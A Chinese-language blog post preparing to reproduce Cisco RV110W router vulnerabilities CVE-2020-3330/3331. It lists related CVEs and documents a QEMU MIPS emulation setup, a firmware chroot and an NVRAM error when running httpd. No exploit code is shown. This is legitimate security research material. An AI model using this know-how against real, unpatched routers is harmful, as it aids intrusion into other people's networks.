<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":230,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="telnet弱口令+sscanf栈溢出漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE复现 | CiscoRV110W CVE2020-3330&#x2F;3331">
<meta property="og:url" content="http://example.com/2021/09/25/ciscoRV110w-CVE-2020-3331/index.html">
<meta property="og:site_name" content="71&#39;s blog">
<meta property="og:description" content="telnet弱口令+sscanf栈溢出漏洞">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/09/26/sDcdxgS7iwmhTIO.png">
<meta property="og:image" content="https://i.loli.net/2021/09/26/eyVcdLjigJ4t7GZ.png">
<meta property="og:image" content="https://i.loli.net/2021/09/27/6VoRuWpAyskGDtK.png">
<meta property="og:image" content="https://i.loli.net/2021/09/27/MEzcvL3WsBx7aNl.png">
<meta property="og:image" content="https://i.loli.net/2021/09/27/N5BDWoZw6LhqSaV.png">
<meta property="og:image" content="https://i.loli.net/2021/09/28/OrhbHt4wevVD7FY.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/KulXfc8MsxvUD4w.png">
<meta property="og:image" content="https://i.loli.net/2021/10/10/PBf1KDOq4klxiAs.png">
<meta property="og:image" content="https://i.loli.net/2021/10/10/PDBm9FX5R2s4316.png">
<meta property="og:image" content="https://i.loli.net/2021/10/09/rajoVcqpxg7NMKX.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/wYHtiPjfQeNKRUy.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/mhokus2Eg6tLeHi.png">
<meta property="og:image" content="https://i.loli.net/2021/10/10/PZ69XEK4gwYWRo8.png">
<meta property="og:image" content="https://i.loli.net/2021/10/10/gEfpbI2TUCYF4sO.png">
<meta property="og:image" content="https://i.loli.net/2021/10/10/SFZa71PGxUnE4N6.png">
<meta property="og:image" content="https://i.loli.net/2021/10/10/hpxKHSYDN6aymuq.png">
<meta property="og:image" content="https://i.loli.net/2021/10/10/qY4pMbsrVnd2hHv.png">
<meta property="article:published_time" content="2021-09-25T13:39:58.000Z">
<meta property="article:modified_time" content="2021-11-01T08:28:29.551Z">
<meta property="article:author" content="7ee1n">
<meta property="article:tag" content="mips">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/09/26/sDcdxgS7iwmhTIO.png">

<link rel="canonical" href="http://example.com/2021/09/25/ciscoRV110w-CVE-2020-3331/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE复现 | CiscoRV110W CVE2020-3330/3331 | 71's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">71's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/25/ciscoRV110w-CVE-2020-3331/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="7ee1n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="71's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE复现 | CiscoRV110W CVE2020-3330/3331
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-25 21:39:58" itemprop="dateCreated datePublished" datetime="2021-09-25T21:39:58+08:00">2021-09-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-11-01 16:28:29" itemprop="dateModified" datetime="2021-11-01T16:28:29+08:00">2021-11-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cve/" itemprop="url" rel="index"><span itemprop="name">cve</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/09/25/ciscoRV110w-CVE-2020-3331/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/25/ciscoRV110w-CVE-2020-3331/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>telnet弱口令+sscanf栈溢出漏洞</p>
</blockquote>
<span id="more"></span>



<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>有师傅对 RV 110w 出现过的漏洞都进行了复现：<a target="_blank" rel="noopener" href="https://wzt.ac.cn/2020/11/10/cisco-rv110w-bugs/">wzt：Cisco RV110W 数个漏洞</a> 。</p>
<p>整理如下，除此之外还能在 <a target="_blank" rel="noopener" href="https://tools.cisco.com/security/center/publicationListing.x?product=Cisco&keyword=rv110w&impact=critical&sort=-day_sir#~Vulnerabilities">CISCO</a>官网找到更多。</p>
<table>
<thead>
<tr>
<th>CVE编号</th>
<th>影响型号</th>
<th>漏洞简述</th>
<th>修复版本</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58444033">CVE-2019-1663</a></td>
<td>RV110w, RV130w, RV215w</td>
<td>管理接口远程命令执行漏洞：httpd服务对用户提交的数据验证不严格，strcpy栈溢出，可实现任意代码执行。</td>
<td>(110w)1.2.2.8/(130w)1.0.3.51</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ">CVE-2020-3144</a></td>
<td>RV110w, RV130, RV130w, RV215w</td>
<td>身份认证绕过漏洞，对session的管理存在问题，可构造特殊格式的 HTTP 请求触发漏洞，获取管理员权限。</td>
<td>(110w)1.2.2.8</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX">CVE-2020-3145/3146</a></td>
<td>RV110w, RV130, RV130w, RV215w</td>
<td>管理接口远程命令执行漏洞：对用户提交的数据验证不严格，sprintf栈溢出，可实现任意代码执行。（后台漏洞，价值不大）</td>
<td>(110w)1.2.2.8</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3150">CVE-2020-3150</a></td>
<td>RV110w, RV215w</td>
<td>http请求授权不当漏洞：有效用户打开过设备文件后，攻击者可访问web管理界面的特定URI二次访问。</td>
<td>(110w)1.2.2.8</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX">CVE-2020-3323</a></td>
<td>RV110w, RV130, RV130w, RV215w</td>
<td>管理接口远程命令执行漏洞：httpd服务对用户提交的数据验证不严格，strlen空指针引用、sscanf栈溢出，可实现任意代码执行。</td>
<td>(110w)1.2.2.8</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3330">CVE-2020-3330</a></td>
<td>RV110w</td>
<td>telnet服务远程登陆漏洞：默认账户静态密码</td>
<td>(110w)1.2.2.8</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3331">CVE-2020-3331</a></td>
<td>RV110w, RV215w</td>
<td>sscanf函数栈溢出漏洞</td>
<td>(110w)1.2.2.8</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cisco-sb-rv-overflow-htpymMB5">CVE-2021-34730</a></td>
<td>RV110w, RV130, RV130w, RV215w</td>
<td>管理接口远程命令执行漏洞：upnp服务对用户提交的数据验证不严格，strcpy栈溢出，可实现任意代码执行。</td>
<td>(110w)1.2.2.8</td>
</tr>
</tbody></table>
<ul>
<li>栈溢出（bin）：2019-1663、2020-3145/3146、2020-3323、2020-3331、2021-34730</li>
<li>认证绕过（web）：2020-3144、2020-3150</li>
<li>弱密码：2020-3330</li>
</ul>
<p>大半是栈溢出漏洞，而且都是存在httpd服务中。从影响设备上来看，RV 110w 都有这些漏洞，RV 130w 和RV 215w 基本上都有。对于 RV 110w 来说，应该大部分漏洞都在<a target="_blank" rel="noopener" href="https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8">最终版 1.2.2.8</a> 中修复了，不过旧的版本都能下载。如果在比赛时拿到了一个旧版本的 bin 文件，如何确定它存在的是哪些漏洞呢，或者说如何快速确定到有漏洞的文件、函数，轩哥这篇博客的思路写得很清晰了： <a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现</a> 。</p>
<p>网上找到的复现博客都是 RV 110w 或 RV 130w 。那 RV 120w 呢？很可惜它是一款 EOL（End of Life）的产品。目前 RV 110w 和 RV 130w 只是停止销售，还没 EOL，官方的终止支持日期是 2024年。关于它们的区别我们可以直接看 data sheet：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cisco.com/c/en/us/products/collateral/routers/rv110w-wireless-n-vpn-firewall/data_sheet_c78-660141.html">Data Sheet: Cisco RV 110W Wireless-N VPN Firewall</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.cisco.com/c/en/us/products/collateral/routers/rv120w-wireless-n-vpn-firewall/DS_C78-590161-00.html">Data Sheet: Cisco RV 120W Wireless-N VPN Firewall</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.cisco.com/c/en/us/products/collateral/routers/small-business-rv-series-routers/datasheet-c78-731522.html">Data Sheet: Cisco RV 130W Wireless-N VPN Firewall</a> </li>
</ul>
<p>我个人觉得区别不大，简单来说就是：</p>
<ul>
<li>130w 支持千兆，110w 和 120w 都是百兆网口。</li>
<li>120w 更适合多个 VPN 的场景，130w 更适合企业或偏远地区（稳定性更强）。</li>
<li>130w 增加了些安全设置，提供的服务相对来说更多些。</li>
</ul>
<p>RV120w 的停售和终止支持的时间都比 110w、130w 的早四年，也许这就是它 CVE 少的原因之一？通过 <a target="_blank" rel="noopener" href="https://cve.mitre.org/">CVE</a> 和 <a target="_blank" rel="noopener" href="https://tools.cisco.com/security/center/publicationListing.x?product=Cisco&keyword=rv120w&impact=critical&sort=-day_sir#~Vulnerabilities">CISCO</a> 官网搜集到的信息如下：</p>
<table>
<thead>
<tr>
<th>CVE编号</th>
<th>影响型号</th>
<th>漏洞简述</th>
<th>修复版本</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2177">CVE-2014-2177</a></td>
<td>RV120w, RV220w, RV180/180w</td>
<td>网络诊断管理界面中存在命令注入漏洞</td>
<td>(120w)1.0.5.9</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2178">CVE-2014-2178</a></td>
<td>RV120w, RV220w, RV180/180w</td>
<td>Web界面中的 CSRF 漏洞，远程攻击者可劫持身份验证管理员</td>
<td>(120w)1.0.5.9</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2179">CVE-2014-2179</a></td>
<td>RV120w, RV220w, RV180/180w</td>
<td>文件任意上传漏洞</td>
<td>(120w)1.0.5.9</td>
</tr>
</tbody></table>
<p>全是 Web 高危漏洞，都在最终版本中修复了。看来 120w 漏洞的复现不太适合我，后面有时间再补上吧emm，不过 120w 的固件也许可以拿来与 110w 和 130w 的进行对比。130w的漏洞复现会在下一篇博客中补上。</p>
<h2 id="qemu-模拟"><a href="#qemu-模拟" class="headerlink" title="qemu 模拟"></a>qemu 模拟</h2><p>参考博客🧠：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-218182.htm">从模糊测试到漏洞利用–WRT54G无线路由器漏洞挖掘分析实战</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266357.htm#msg_header_h2_0">lxonz神：思科RV110W CVE-2020-3331漏洞调试与iot靶场搭建</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_21063873/article/details/103037515">基于QEMU的NVRAM仿真</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34408717/article/details/87981027">Linksys WRT54G 路由器溢出漏洞分析—— 运行环境修复</a></li>
</ul>
<h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><p>要注意 110w 是 MIPS架构，130w 是 ARM 架构。对应的 images 都可以从 debian 上下载：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></li>
<li><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a></li>
<li><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/">https://people.debian.org/~aurel32/qemu/armhf/</a></li>
</ul>
<p>大小端、32/64位 对应用的镜像都不同，具体看readme。比如 32 位的 MIPS 大端架构，用的是下面这个组合：</p>
<p><img src="https://i.loli.net/2021/09/26/sDcdxgS7iwmhTIO.png"></p>
<p>en，如果点击文件后没下载，换个浏览器试试🤦‍♀️。这些文件最后修改的时间都是2013、2014年，估计这网站也比较老，也许跟版本新一些的浏览器有点不兼容。</p>
<p>放到同一个文件夹中，再写一个 run.sh：（这是在 hws 上课时旁边的一个大师傅写的，当时看不懂，但用着不会报错，直接用就好了，万分感谢🙏）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr virbr0</span><br><span class="line">sudo ifconfig virbr0 192.168.122.1/24 up</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.122.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>

<p>这里涉及到些通信知识，学完计网的我才理解好emm。前面四条指令是添加虚拟网卡，目的是使 debian 虚拟机和宿主机通信，所以虚拟机启动以后配置的 ip 和我们添加的虚拟网卡必须在同一个网段。（不通信怎么上传文件和调试啊，必须配好这些 ip ）如果添加完后，又开了一次虚拟机，换张 tap 网卡就可以了。</p>
<p>剩下的一条是 qemu system 的启动命令，参数大概是指定了镜像文件、内核启动的附加参数、创建什么设备等，具体可以查手册。</p>
<p>启动后可以看到 debian 中的 eth0 网卡是没有配置 ip 的：</p>
<p><img src="https://i.loli.net/2021/09/26/eyVcdLjigJ4t7GZ.png"></p>
<p>配置前先确保 eth0 允许启动：</p>
<p>（补—— lo 是 Loop 的意思，本地回环网卡，也就是 0.0.0.0 或 127.0.0.1，跟自己通信；eth 是 Ethernet的意思，以太网卡，所以跟外部通信我们需要看 eth0 网卡。）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~# cat /etc/network/interfaces</span><br><span class="line"><span class="meta">#</span><span class="bash"> This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and how to activate them. For more information, see interfaces(5).</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The loopback network interface</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The primary network interface</span></span><br><span class="line">allow-hotplug eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>



<p>接下来配同一个网段的 ip 就ok了。可以用 ssh 或者 ping 来测试是否能通信。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~# ifconfig eth0 192.168.122.3 up</span><br></pre></td></tr></table></figure>



<p>一般应该都是在本地上传固件的文件系统到指定路径，再在 debian 中更换目录后运行启动脚本。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root root@192.168.122.3:/root/</span><br></pre></td></tr></table></figure>



<p>那么为什么需要用全系统模拟模式来运行，而不用用户模式呢？</p>
<p>从 <a target="_blank" rel="noopener" href="https://wiki.archlinux.org/title/QEMU_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">QEMU手册</a> 我们可以找到答案：用户模式对动态链接的可执行文件的运行不太支持，有时候如果有对应的动态库，可以用 -L 设定。而全系统模式虽然支持，但正因为它模拟的是完整的系统，还包括处理器、外设等，它的运行速度会比用户模式慢。</p>
<p>通过漏洞信息搜集我们知道，这个 CVE 漏洞在 httpd 服务中。但是在实际的场景下，我们需要通过检索固件中的关键信息、扫描端口进行分析、流量抓取、调试等手段才能定位到存在漏洞的地方，我把这一部分留到后面的真机实验再做。因为 RV 110w 没买到真机，这里用 qemu-system 进行模拟。</p>
<p>注意镜像要换成 mipsel。这从解压出来的文件系统中随便拉个可执行文件出来 file 一下就知道了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=ttyS0&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>

<p>不过同一个环境下，我的 qemu-system-mips 能起，qemu-system-mipsel 倒是卡住了emm。找到这篇《 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/66904366/qemu-system-mips-stuck-after-console-tty0-enabled">Qemu-system-mips stuck after “console tty0 enabled”</a> 》的 answer 后，将 console 参数改成了 ttyS0，也就是将内核进一步的输出也发送到串行端口上，这也是镜像网站上所建议的做法。之后打印出 <code>Unable to mount root fs on unknown-block...</code> 的错误信息。排除了是内存不够的问题后，猜测是内核崩溃问题。更新自己的内核版本，再启动就正常了… 现在用的是（ubuntu 18.04）：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ch331n@ubuntu:~/cs/iot/debian/mipsel$ uname -r</span><br><span class="line">4.15.0-158-generic</span><br></pre></td></tr></table></figure>



<h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><p>很重要的挂载步骤。因为 qemu-system 启动的天生缺少 /proc，如果不挂载上去， ps 查看进程是空的，找不到目标程序的 pid，也不能用 gdbserver attach了。emm，其实如果目标程序直接运行就可以的话，应该可以用 gdberver 一条命令启动调试的。但是这里先需要 LD_PRELOAD 一个 so 文件（后面会提到），用 attach 的方式调试好一些。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./dev/</span><br><span class="line">mount -t proc /proc/ ./proc/</span><br><span class="line">chroot . sh </span><br></pre></td></tr></table></figure>



<h3 id="nvram"><a href="#nvram" class="headerlink" title="nvram"></a>nvram</h3><p>先运行看看目标文件，这里以 httpd 为例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mipsel:~/cve-2020-3331# chroot squashfs-root sh</span><br><span class="line">BusyBox v1.7.2 (2019-04-22 16:08:01 CST) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">bin   data  dev   etc   lib   mnt   proc  sbin  sys   tmp   usr   var   www</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> usr/sbin</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ./httpd</span></span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br></pre></td></tr></table></figure>



<p>en，为什么它会访问 NVRAM 呢🤔 是我孤陋寡闻了，它就是非易失性存取存储器，也是我们常说的断电后能保留数据信息的存储器。找到这篇《<a target="_blank" rel="noopener" href="https://heipg.cn/tutorial/what-is-nvram.html">NVRAM是什么？为什么对黑苹果重要？</a>》，看完大概了解它的重要性了。btw，关于易失、非易失的原理区别可以自行了解下：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/64752508">不同类别存储器的基本原理</a>、<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35152668#:~:text=%E4%BB%8B%E7%BB%8D%E4%BA%86%E9%9D%9E%E6%98%93%E5%A4%B1%E6%80%A7%E5%AD%98%E5%82%A8%E5%99%A8%EF%BC%88non-volatile%20memory%2C%20NVM%EF%BC%89RRAM%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%82%20%E5%85%B6%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E6%98%AF%EF%BC%9A%20%281%29%20%E5%9C%A8%E6%9C%AA%E5%8A%A0%E7%94%B5%E5%8E%8B%E6%97%B6%EF%BC%8C%E7%94%B1%E4%BA%8E%E7%94%B5%E6%9E%81%E9%97%B4%E6%B0%A7%E5%8C%96%E5%B1%82%E9%BB%98%E8%AE%A4%E7%BB%9D%E7%BC%98%EF%BC%8CRRAM%E4%B8%A4%E7%AB%AF%E4%B8%BA%E9%AB%98%E9%98%BB%E6%8A%97%E7%8A%B6%E6%80%81%EF%BC%88HRS%EF%BC%89%EF%BC%9B,%282%29%20%E5%9C%A8%E4%B8%A4%E7%AB%AF%E5%8A%A0%E4%B8%80%E7%94%B5%E5%8E%8B%EF%BC%8C%E8%8B%A5%E8%AF%A5%E7%94%B5%E5%8E%8B%E8%B6%85%E8%BF%87%E2%80%9C%E5%BD%A2%E6%88%90%E7%94%B5%E5%8E%8B%E2%80%9D%EF%BC%88forming%20voltage%EF%BC%8C%20%EF%BC%89%E6%97%B6%EF%BC%8C%E5%88%99%E6%B0%A7%E5%8C%96%E5%B1%82%E4%B8%AD%E9%97%B4%E5%BD%A2%E6%88%90%E2%80%9C%E5%AF%BC%E7%94%B5%E7%BA%A4%E7%BB%B4%E2%80%9D%EF%BC%88conductive%20filatment%2C%20CF%EF%BC%89%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%BF%9B%E5%85%A5%E4%BD%8E%E9%98%BB%E6%8A%97%E7%8A%B6%E6%80%81%EF%BC%88LRS%EF%BC%89%EF%BC%88%E6%AF%94HRS%E7%BA%A6%E4%BD%8E%E4%B8%89%E4%B8%AA%E6%95%B0%E9%87%8F%E7%BA%A7%EF%BC%89%EF%BC%9B%EF%BC%883%EF%BC%89%E4%BB%A5%E5%8F%8C%E6%9E%81%E5%9E%8B%EF%BC%88bipolar%EF%BC%89%E4%B8%BA%E4%BE%8B%EF%BC%8C%E8%8B%A5%E7%BB%99%E5%A4%84%E4%BA%8ELRS%E7%9A%84RRAM%E4%B8%A4%E7%AB%AF%E5%8A%A0%E4%B8%80%E5%8F%8D%E5%90%91%E7%9A%84%E7%94%B5%E5%8E%8B%EF%BC%8C%E5%99%A8%E4%BB%B6%E5%B0%86%E4%BB%8ELRS%E5%86%8D%E6%AC%A1%E5%8F%98%E4%B8%BAHRS%E3%80%82">RRAM</a> 等。简单来说就是看它容不容易漏电，RAM的电容很小、容易漏、可以通过上电刷新；NVM 就是在电子器件层面通过加电压等方法，使它不易漏电、能保存信息。</p>
